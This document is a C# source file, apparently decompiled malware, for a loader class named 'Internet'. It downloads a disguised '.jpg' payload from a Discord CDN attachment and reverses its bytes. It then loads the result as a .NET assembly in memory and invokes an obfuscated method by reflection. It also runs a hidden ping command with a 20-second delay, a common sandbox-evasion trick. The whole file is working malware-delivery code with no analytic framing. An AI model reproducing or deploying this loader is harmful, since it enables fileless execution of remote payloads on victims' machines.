using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Reflection;
using System.Threading;

namespace Dajrx;

internal class Internet
{
	internal static byte[] Png
	{
		get
		{
			byte[] array = new BinaryReader(WebRequest.Create("https://cdn.discordapp.com/attachments/913584216825028612/945612893792124968/Pgmxmmw.jpg").GetResponse().GetResponseStream()).ReadBytes(84155470);
			typeof(Array).GetMethod("Reverse", new Type[1] { typeof(Array) })!.Invoke(null, new object[1] { array });
			return array;
		}
	}

	internal static void Config()
	{
		try
		{
			ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
		}
		catch
		{
		}
		Process.Start(new ProcessStartInfo
		{
			FileName = "cmd",
			Arguments = "/c ping yahoo.com",
			WindowStyle = ProcessWindowStyle.Hidden
		});
		Thread.Sleep(TimeSpan.FromSeconds(20.0));
	}

	internal static void App()
	{
		AppDomain appDomain = (AppDomain)typeof(AppDomain).GetProperty("CurrentDomain")!.GetValue(null, null);
		_ = (Assembly)appDomain.GetType().InvokeMember("Load", BindingFlags.InvokeMethod, null, appDomain, new object[1] { Png });
	}

	internal static bool Info()
	{
		Assembly[] assemblies = AppDomain.CurrentDomain.GetAssemblies();
		foreach (Assembly assembly in assemblies)
		{
			Type[] types = assembly.GetTypes();
			foreach (Type type in types)
			{
				MethodInfo[] methods = type.GetMethods();
				foreach (MethodInfo methodInfo in methods)
				{
					if (methodInfo.Name == "Rlppmviasyd")
					{
						return (bool)methodInfo.Invoke(null, null);
					}
				}
			}
		}
		return false;
	}
}
